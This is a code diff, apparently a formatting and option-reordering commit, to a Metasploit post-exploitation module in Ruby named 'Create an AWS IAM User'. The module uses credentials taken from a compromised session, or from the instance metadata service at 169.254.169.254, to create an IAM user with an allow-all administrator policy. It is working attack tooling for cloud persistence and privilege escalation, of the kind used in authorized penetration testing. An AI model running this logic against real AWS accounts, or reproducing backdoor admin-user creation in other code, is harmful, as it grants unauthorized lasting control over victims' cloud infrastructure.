@@ -1,3 +1,8 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 require 'msf/core'
 require 'metasploit/framework/aws/client'
 
@@ -5,41 +10,45 @@ class MetasploitModule < Msf::Post
 
   include Metasploit::Framework::Aws::Client
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Create an AWS IAM User",
-      'Description'    => %q{
-        This module will attempt to create an AWS (Amazon Web Services) IAM
-        (Identity and Access Management) user with Admin privileges.
-      },
-      'License'        => MSF_LICENSE,
-      'Platform'      => %w(unix),
-      'SessionTypes'  => %w(shell meterpreter),
-      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>'],
-      'References'     => [
-        [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]
-      ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => "Create an AWS IAM User",
+        'Description'    => %q{
+          This module will attempt to create an AWS (Amazon Web Services) IAM
+          (Identity and Access Management) user with Admin privileges.
+        },
+        'License'        => MSF_LICENSE,
+        'Platform'       => %w(unix),
+        'SessionTypes'   => %w(shell meterpreter),
+        'Author'         => ['Javier Godinez <godinezj[at]gmail.com>'],
+        'References'     => [
+          [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]
+        ]
+      )
+    )
 
     register_options(
       [
+        OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),
+        OptString.new('AccessKeyId', [false, 'AWS access key', '']),
+        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
+        OptString.new('Token', [false, 'AWS session token', ''])
+      ]
+    )
+    register_advanced_options(
+      [
+        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
         OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
         OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
         OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
         OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
-        OptString.new('IAM_USERNAME', [false, 'Username for the user to be created', '']),
         OptString.new('Region', [true, 'The default region', 'us-east-1' ])
-      ])
-    register_advanced_options(
-      [
-        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
-        OptString.new('AccessKeyId', [false, 'AWS access key', '']),
-        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
-        OptString.new('Token', [false, 'AWS session token', ''])
-      ])
+      ]
+    )
     deregister_options('VHOST')
   end
-
 
   def run
     # setup creds for making IAM API calls
@@ -58,7 +67,7 @@ class MetasploitModule < Msf::Post
     end
 
     # create user
-    username = datastore['IAM_USERNAME'].empty? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
+    username = datastore['IAM_USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
     print_status("Creating user: #{username}")
     action = 'CreateUser'
     doc = call_iam(creds, 'Action' => action, 'UserName' => username)
@@ -119,4 +128,3 @@ class MetasploitModule < Msf::Post
     {}
   end
 end
-
